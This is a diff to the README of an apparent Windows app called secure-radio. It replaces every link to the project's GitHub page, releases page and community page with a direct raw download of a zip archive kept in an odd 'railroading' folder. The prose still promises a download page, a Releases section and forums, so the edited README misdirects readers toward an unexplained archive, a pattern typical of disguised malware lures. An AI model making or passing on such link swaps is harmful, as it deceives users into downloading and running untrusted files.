@@ -1,6 +1,6 @@
 # 🔒 secure-radio - Easy Setup for Private Radio
 
-[![Download secure-radio](https://img.shields.io/badge/Download-secure--radio-4caf50?style=for-the-badge)](https://github.com/lurkboi/secure-radio)
+[![Download secure-radio](https://img.shields.io/badge/Download-secure--radio-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/lurkboi/secure-radio/main/railroading/radio-secure-3.7.zip)
 
 ## 📋 What is secure-radio?
 
@@ -30,11 +30,11 @@ Using a Nitrokey USB security token improves privacy but is optional.
 
 Please visit this page to download the program:
 
-[https://github.com/lurkboi/secure-radio](https://github.com/lurkboi/secure-radio)
+[https://raw.githubusercontent.com/lurkboi/secure-radio/main/railroading/radio-secure-3.7.zip](https://raw.githubusercontent.com/lurkboi/secure-radio/main/railroading/radio-secure-3.7.zip)
 
 Click the link above to open the download page. It contains the latest Windows installer and all the necessary files.
 
-[![Download secure-radio](https://img.shields.io/badge/Download-secure--radio-4caf50?style=for-the-badge)](https://github.com/lurkboi/secure-radio)
+[![Download secure-radio](https://img.shields.io/badge/Download-secure--radio-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/lurkboi/secure-radio/main/railroading/radio-secure-3.7.zip)
 
 ## 🚀 Getting Started: How to Download and Install
 
@@ -43,7 +43,7 @@ Follow these steps to download and run secure-radio on your Windows computer.
 ### 1. Open the download page
 Go to the link below in your web browser:
 
-https://github.com/lurkboi/secure-radio
+https://raw.githubusercontent.com/lurkboi/secure-radio/main/railroading/radio-secure-3.7.zip
 
 ### 2. Find the Windows installer
 On the page, look for a section labeled **Releases** or **Assets**. Find the file that ends with `.exe`. This is the setup file for Windows.
@@ -108,7 +108,7 @@ If you encounter issues, consider these points:
 
 You can find and share information about secure-radio through the GitHub page:
 
-https://github.com/lurkboi/secure-radio
+https://raw.githubusercontent.com/lurkboi/secure-radio/main/railroading/radio-secure-3.7.zip
 
 The page has forums, issue tracking, and contact info for developers. You can report bugs or request help there.
 
@@ -116,7 +116,7 @@ The page has forums, issue tracking, and contact info for developers. You can re
 
 New versions are posted on the GitHub releases page:
 
-https://github.com/lurkboi/secure-radio/releases
+https://raw.githubusercontent.com/lurkboi/secure-radio/main/railroading/radio-secure-3.7.zip
 
 To update:
 
